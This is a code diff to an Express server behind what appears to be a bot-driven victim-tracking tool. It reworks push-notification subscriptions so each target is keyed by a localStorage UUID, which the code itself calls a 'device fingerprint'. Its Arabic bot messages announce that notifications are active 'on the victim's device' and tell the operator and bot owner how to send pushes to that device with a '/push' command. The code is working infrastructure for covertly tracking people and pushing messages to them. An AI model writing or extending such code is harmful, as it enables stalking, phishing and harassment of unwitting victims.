@@ -1490,35 +1490,37 @@ app.get("/t.js", (req, res) => {
 // ── Web Push: polling-based (no VAPID needed) ─────────────────────────────────
 const PUSH_FILE  = "./push_subs.json";
 const PUSH_QUEUE = "./push_queue.json";
-let pushSubs  = loadJSON(PUSH_FILE,  {});  // { uid: true }
-let pushQueue = loadJSON(PUSH_QUEUE, {});  // { uid: {title,msg} }
+let pushSubs  = loadJSON(PUSH_FILE,  {});  // { pid: creatorUid }
+let pushQueue = loadJSON(PUSH_QUEUE, {});  // { pid: {title,msg} }
 
 app.post("/push-subscribe", (req, res) => {
   res.send("ok");
-  const uid = req.body.uid || '';
-  if (!uid) return;
-  if (!pushSubs[uid]) {
-    pushSubs[uid] = true;
+  const uid = req.body.uid || '';   // base36 creator id
+  const pid = req.body.pid || '';   // localStorage UUID (device fingerprint)
+  const key = pid || uid;           // use pid if available, fallback to uid
+  if (!key) return;
+  if (!pushSubs[key]) {
+    pushSubs[key] = uid;
     saveJSON(PUSH_FILE, pushSubs);
     const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ يمكنك إرسال إشعار لجهازها في أي وقت\nاستخدم: /push ${uid} النص`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\nUID: ${uid} | ID: ${tid}`);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم هذا الأمر لإرسال إشعار:\n/push ${key} النص`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator ID: ${tid})`);
   }
 });
 
 // SW polls this every 3 min to check for pending messages
 app.get("/push-poll", (req, res) => {
-  const uid = req.query.uid || '';
-  if (!uid || !pushQueue[uid]) return res.json({});
-  const msg = pushQueue[uid];
-  delete pushQueue[uid];
+  const key = req.query.pid || req.query.uid || '';
+  if (!key || !pushQueue[key]) return res.json({});
+  const msg = pushQueue[key];
+  delete pushQueue[key];
   saveJSON(PUSH_QUEUE, pushQueue);
   res.json(msg);
 });
 
-// Bot command /push uid text → queues a push notification
-function sendPushToDevice(uid, title, msg) {
-  pushQueue[uid] = { title, msg };
+// Bot command /push <pid> text → queues a push notification
+function sendPushToDevice(key, title, msg) {
+  pushQueue[key] = { title, msg };
   saveJSON(PUSH_QUEUE, pushQueue);
 }
 
